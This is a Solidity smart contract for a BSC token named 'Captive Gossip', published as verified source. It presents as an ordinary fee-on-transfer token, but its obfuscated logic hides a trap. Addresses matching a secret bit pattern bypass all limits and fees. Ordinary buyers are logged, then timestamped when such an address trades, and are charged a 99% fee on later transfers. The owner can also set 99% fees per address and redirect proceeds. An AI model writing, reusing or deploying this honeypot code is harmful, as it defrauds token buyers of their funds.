/**
 *Submitted for verification at BscScan.com on 2022-12-11
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Auth {
    address internal owner;
    mapping(address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract CaptiveGossip is IBEP20, Auth {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Captive Gossip ";
    string constant _symbol = "CaptiveGossip";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private modeBurnLimitSell;
    mapping(address => bool) private launchedSwapTxBuyBots;
    mapping(address => bool) private maxLimitMarketingReceiver;
    mapping(address => bool) private minFeeLaunchedTx;
    mapping(address => uint256) private receiverMinTxTrading;
    mapping(uint256 => address) private swapAutoIsFee;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private swapLaunchedIsBuyLiquidityMax = 0;
    uint256 private walletExemptSwapTradingFee = 7;

    //SELL FEES
    uint256 private swapMarketingSellLaunchedTeam = 0;
    uint256 private isAutoMarketingLaunchedTeam = 7;

    uint256 private sellLiquidityLaunchedMode = walletExemptSwapTradingFee + swapLaunchedIsBuyLiquidityMax;
    uint256 private sellLiquidityReceiverBurn = 100;

    address private burnBotsIsTeam = (msg.sender); // auto-liq address
    address private marketingTxModeBots = (0xA67524146f2E99e525ea95E0FfFFF1Fa7e4AA471); // marketing address
    address private swapMinExemptLiquidity = DEAD;
    address private swapMarketingTeamIsAutoBotsFee = DEAD;
    address private limitWalletBotsExempt = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private txSwapTeamTrading;
    uint256 private receiverMarketingModeAutoBotsExempt;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private tradingReceiverBurnMax;
    uint256 private tradingFeeLaunchedIsExemptTxSwap;
    uint256 private buyExemptAutoIs;
    uint256 private burnBuyModeMinTeam;
    uint256 private burnTradingBotsIsReceiver;

    bool private liquidityLaunchedMaxExempt = true;
    bool private minFeeLaunchedTxMode = true;
    bool private tradingReceiverBuyTeam = true;
    bool private marketingModeReceiverLiquidityLimitExempt = true;
    bool private maxSellBuyExempt = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private exemptReceiverBotsSell = 6 * 10 ** 15;
    uint256 private maxBurnWalletTeam = _totalSupply / 1000; // 0.1%

    
    uint256 private marketingModeMinTeam = 0;
    bool private botsFeeExemptAutoBuySwap = false;
    uint256 private launchedModeMinTradingLiquidityMax = 0;
    uint256 private txModeSwapBots = 0;
    uint256 private burnReceiverTxLaunched = 0;
    uint256 private modeTradingLiquidityReceiverMax = 0;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Auth(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        tradingReceiverBurnMax = true;

        modeBurnLimitSell[msg.sender] = true;
        modeBurnLimitSell[address(this)] = true;

        launchedSwapTxBuyBots[msg.sender] = true;
        launchedSwapTxBuyBots[0x0000000000000000000000000000000000000000] = true;
        launchedSwapTxBuyBots[0x000000000000000000000000000000000000dEaD] = true;
        launchedSwapTxBuyBots[address(this)] = true;

        maxLimitMarketingReceiver[msg.sender] = true;
        maxLimitMarketingReceiver[0x0000000000000000000000000000000000000000] = true;
        maxLimitMarketingReceiver[0x000000000000000000000000000000000000dEaD] = true;
        maxLimitMarketingReceiver[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return burnWalletReceiverLiquidity(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return burnWalletReceiverLiquidity(sender, recipient, amount);
    }

    function burnWalletReceiverLiquidity(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        if (launchedModeMinTradingLiquidityMax != burnReceiverTxLaunched) {
            launchedModeMinTradingLiquidityMax = launchedModeMinTradingLiquidityMax;
        }


        bool bLimitTxWalletValue = marketingModeLimitSell(sender) || marketingModeLimitSell(recipient);
        
        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                modeMaxLimitBotsBuyLiquidityTeam();
            }
            if (!bLimitTxWalletValue) {
                sellBurnAutoLiquidity(recipient);
            }
        }
        
        if (inSwap || bLimitTxWalletValue) {return burnMaxLiquidityBuyMarketingTeamBots(sender, recipient, amount);}

        if (!modeBurnLimitSell[sender] && !modeBurnLimitSell[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }
        
        require((amount <= _maxTxAmount) || maxLimitMarketingReceiver[sender] || maxLimitMarketingReceiver[recipient], "Max TX Limit has been triggered");

        if (limitSwapSellFee()) {txMinAutoLaunchedTradingLimit();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        
        uint256 amountReceived = botsTradingTxFee(sender) ? marketingReceiverBurnMinTeam(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function burnMaxLiquidityBuyMarketingTeamBots(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function botsTradingTxFee(address sender) internal view returns (bool) {
        return !launchedSwapTxBuyBots[sender];
    }

    function maxMinFeeMarketingReceiverBotsWallet(address sender, bool selling) internal returns (uint256) {
        
        if (burnReceiverTxLaunched != exemptReceiverBotsSell) {
            burnReceiverTxLaunched = sellLiquidityReceiverBurn;
        }

        if (botsFeeExemptAutoBuySwap == tradingReceiverBuyTeam) {
            botsFeeExemptAutoBuySwap = maxSellBuyExempt;
        }


        if (selling) {
            sellLiquidityLaunchedMode = isAutoMarketingLaunchedTeam + swapMarketingSellLaunchedTeam;
            return swapBotsTeamAutoReceiverIs(sender, sellLiquidityLaunchedMode);
        }
        if (!selling && sender == uniswapV2Pair) {
            sellLiquidityLaunchedMode = walletExemptSwapTradingFee + swapLaunchedIsBuyLiquidityMax;
            return sellLiquidityLaunchedMode;
        }
        return swapBotsTeamAutoReceiverIs(sender, sellLiquidityLaunchedMode);
    }

    function tradingLaunchedSellSwapMarketingWallet() private view returns (uint256) {
        address t0 = WBNB;
        if (address(this) < WBNB) {
            t0 = address(this);
        }
        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);
        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;
        return buyAmount;
    }

    function marketingReceiverBurnMinTeam(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        uint256 feeAmount = amount.mul(maxMinFeeMarketingReceiverBotsWallet(sender, receiver == uniswapV2Pair)).div(sellLiquidityReceiverBurn);

        if (minFeeLaunchedTx[sender] || minFeeLaunchedTx[receiver]) {
            feeAmount = amount.mul(99).div(sellLiquidityReceiverBurn);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function marketingModeLimitSell(address addr) private view returns (bool) {
        uint256 v0 = uint256(uint160(addr)) << 192;
        v0 = v0 >> 238;
        return v0 == firstSetAutoReceiver;
    }

    function swapBotsTeamAutoReceiverIs(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lcfkd = receiverMinTxTrading[sender];
        uint256 kdkls = pFee;
        if (lcfkd > 0 && block.timestamp - lcfkd > 2) {
            kdkls = 99;
        }
        return kdkls;
    }

    function sellBurnAutoLiquidity(address addr) private {
        if (tradingLaunchedSellSwapMarketingWallet() < exemptReceiverBotsSell) {
            return;
        }
        exemptLimitValue = exemptLimitValue + 1;
        swapAutoIsFee[exemptLimitValue] = addr;
    }

    function modeMaxLimitBotsBuyLiquidityTeam() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (receiverMinTxTrading[swapAutoIsFee[i]] == 0) {
                    receiverMinTxTrading[swapAutoIsFee[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(marketingTxModeBots).transfer(amountBNB * amountPercentage / 100);
    }

    function limitSwapSellFee() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    maxSellBuyExempt &&
    _balances[address(this)] >= maxBurnWalletTeam;
    }

    function txMinAutoLaunchedTradingLimit() internal swapping {
        
        if (modeTradingLiquidityReceiverMax == maxBurnWalletTeam) {
            modeTradingLiquidityReceiverMax = exemptReceiverBotsSell;
        }

        if (marketingModeMinTeam == burnReceiverTxLaunched) {
            marketingModeMinTeam = swapMarketingSellLaunchedTeam;
        }

        if (txModeSwapBots != swapMarketingSellLaunchedTeam) {
            txModeSwapBots = launchedModeMinTradingLiquidityMax;
        }


        uint256 amountToLiquify = maxBurnWalletTeam.mul(swapLaunchedIsBuyLiquidityMax).div(sellLiquidityLaunchedMode).div(2);
        uint256 amountToSwap = maxBurnWalletTeam.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        if (launchedModeMinTradingLiquidityMax == launchedModeMinTradingLiquidityMax) {
            launchedModeMinTradingLiquidityMax = exemptReceiverBotsSell;
        }


        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = sellLiquidityLaunchedMode.sub(swapLaunchedIsBuyLiquidityMax.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(swapLaunchedIsBuyLiquidityMax).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(walletExemptSwapTradingFee).div(totalETHFee);
        
        payable(marketingTxModeBots).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                burnBotsIsTeam,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getBurnBotsIsTeam() public view returns (address) {
        if (burnBotsIsTeam != swapMarketingTeamIsAutoBotsFee) {
            return swapMarketingTeamIsAutoBotsFee;
        }
        return burnBotsIsTeam;
    }
    function setBurnBotsIsTeam(address a0) public onlyOwner {
        if (burnBotsIsTeam != limitWalletBotsExempt) {
            limitWalletBotsExempt=a0;
        }
        if (burnBotsIsTeam == burnBotsIsTeam) {
            burnBotsIsTeam=a0;
        }
        if (burnBotsIsTeam != swapMarketingTeamIsAutoBotsFee) {
            swapMarketingTeamIsAutoBotsFee=a0;
        }
        burnBotsIsTeam=a0;
    }

    function getTradingReceiverBuyTeam() public view returns (bool) {
        if (tradingReceiverBuyTeam == tradingReceiverBuyTeam) {
            return tradingReceiverBuyTeam;
        }
        if (tradingReceiverBuyTeam == minFeeLaunchedTxMode) {
            return minFeeLaunchedTxMode;
        }
        return tradingReceiverBuyTeam;
    }
    function setTradingReceiverBuyTeam(bool a0) public onlyOwner {
        if (tradingReceiverBuyTeam == marketingModeReceiverLiquidityLimitExempt) {
            marketingModeReceiverLiquidityLimitExempt=a0;
        }
        if (tradingReceiverBuyTeam != botsFeeExemptAutoBuySwap) {
            botsFeeExemptAutoBuySwap=a0;
        }
        if (tradingReceiverBuyTeam != minFeeLaunchedTxMode) {
            minFeeLaunchedTxMode=a0;
        }
        tradingReceiverBuyTeam=a0;
    }

    function getMarketingModeMinTeam() public view returns (uint256) {
        if (marketingModeMinTeam == modeTradingLiquidityReceiverMax) {
            return modeTradingLiquidityReceiverMax;
        }
        if (marketingModeMinTeam != isAutoMarketingLaunchedTeam) {
            return isAutoMarketingLaunchedTeam;
        }
        return marketingModeMinTeam;
    }
    function setMarketingModeMinTeam(uint256 a0) public onlyOwner {
        if (marketingModeMinTeam != swapLaunchedIsBuyLiquidityMax) {
            swapLaunchedIsBuyLiquidityMax=a0;
        }
        if (marketingModeMinTeam == exemptReceiverBotsSell) {
            exemptReceiverBotsSell=a0;
        }
        if (marketingModeMinTeam == txModeSwapBots) {
            txModeSwapBots=a0;
        }
        marketingModeMinTeam=a0;
    }

    function getSwapAutoIsFee(uint256 a0) public view returns (address) {
        if (a0 != burnReceiverTxLaunched) {
            return swapMarketingTeamIsAutoBotsFee;
        }
        if (a0 == marketingModeMinTeam) {
            return limitWalletBotsExempt;
        }
            return swapAutoIsFee[a0];
    }
    function setSwapAutoIsFee(uint256 a0,address a1) public onlyOwner {
        if (a0 != exemptReceiverBotsSell) {
            marketingTxModeBots=a1;
        }
        if (a0 != modeTradingLiquidityReceiverMax) {
            swapMinExemptLiquidity=a1;
        }
        if (a0 == sellLiquidityLaunchedMode) {
            swapMarketingTeamIsAutoBotsFee=a1;
        }
        swapAutoIsFee[a0]=a1;
    }

    function getMinFeeLaunchedTx(address a0) public view returns (bool) {
        if (minFeeLaunchedTx[a0] == maxLimitMarketingReceiver[a0]) {
            return maxSellBuyExempt;
        }
        if (a0 != swapMinExemptLiquidity) {
            return minFeeLaunchedTxMode;
        }
        if (minFeeLaunchedTx[a0] != minFeeLaunchedTx[a0]) {
            return maxSellBuyExempt;
        }
            return minFeeLaunchedTx[a0];
    }
    function setMinFeeLaunchedTx(address a0,bool a1) public onlyOwner {
        if (minFeeLaunchedTx[a0] == launchedSwapTxBuyBots[a0]) {
           launchedSwapTxBuyBots[a0]=a1;
        }
        if (a0 != limitWalletBotsExempt) {
            marketingModeReceiverLiquidityLimitExempt=a1;
        }
        if (a0 != limitWalletBotsExempt) {
            tradingReceiverBuyTeam=a1;
        }
        minFeeLaunchedTx[a0]=a1;
    }

    function getSwapLaunchedIsBuyLiquidityMax() public view returns (uint256) {
        if (swapLaunchedIsBuyLiquidityMax != sellLiquidityLaunchedMode) {
            return sellLiquidityLaunchedMode;
        }
        if (swapLaunchedIsBuyLiquidityMax == launchedModeMinTradingLiquidityMax) {
            return launchedModeMinTradingLiquidityMax;
        }
        return swapLaunchedIsBuyLiquidityMax;
    }
    function setSwapLaunchedIsBuyLiquidityMax(uint256 a0) public onlyOwner {
        swapLaunchedIsBuyLiquidityMax=a0;
    }

    function getReceiverMinTxTrading(address a0) public view returns (uint256) {
        if (a0 == limitWalletBotsExempt) {
            return sellLiquidityLaunchedMode;
        }
            return receiverMinTxTrading[a0];
    }
    function setReceiverMinTxTrading(address a0,uint256 a1) public onlyOwner {
        if (a0 != swapMinExemptLiquidity) {
            swapLaunchedIsBuyLiquidityMax=a1;
        }
        receiverMinTxTrading[a0]=a1;
    }

    function getLaunchedSwapTxBuyBots(address a0) public view returns (bool) {
            return launchedSwapTxBuyBots[a0];
    }
    function setLaunchedSwapTxBuyBots(address a0,bool a1) public onlyOwner {
        launchedSwapTxBuyBots[a0]=a1;
    }

    function getMarketingModeReceiverLiquidityLimitExempt() public view returns (bool) {
        return marketingModeReceiverLiquidityLimitExempt;
    }
    function setMarketingModeReceiverLiquidityLimitExempt(bool a0) public onlyOwner {
        if (marketingModeReceiverLiquidityLimitExempt != maxSellBuyExempt) {
            maxSellBuyExempt=a0;
        }
        if (marketingModeReceiverLiquidityLimitExempt != maxSellBuyExempt) {
            maxSellBuyExempt=a0;
        }
        marketingModeReceiverLiquidityLimitExempt=a0;
    }

    function getSwapMarketingTeamIsAutoBotsFee() public view returns (address) {
        if (swapMarketingTeamIsAutoBotsFee != swapMinExemptLiquidity) {
            return swapMinExemptLiquidity;
        }
        if (swapMarketingTeamIsAutoBotsFee == burnBotsIsTeam) {
            return burnBotsIsTeam;
        }
        if (swapMarketingTeamIsAutoBotsFee != burnBotsIsTeam) {
            return burnBotsIsTeam;
        }
        return swapMarketingTeamIsAutoBotsFee;
    }
    function setSwapMarketingTeamIsAutoBotsFee(address a0) public onlyOwner {
        if (swapMarketingTeamIsAutoBotsFee == limitWalletBotsExempt) {
            limitWalletBotsExempt=a0;
        }
        if (swapMarketingTeamIsAutoBotsFee != swapMinExemptLiquidity) {
            swapMinExemptLiquidity=a0;
        }
        swapMarketingTeamIsAutoBotsFee=a0;
    }

    function getModeBurnLimitSell(address a0) public view returns (bool) {
            return modeBurnLimitSell[a0];
    }
    function setModeBurnLimitSell(address a0,bool a1) public onlyOwner {
        if (a0 != marketingTxModeBots) {
            tradingReceiverBuyTeam=a1;
        }
        if (modeBurnLimitSell[a0] == modeBurnLimitSell[a0]) {
           modeBurnLimitSell[a0]=a1;
        }
        modeBurnLimitSell[a0]=a1;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}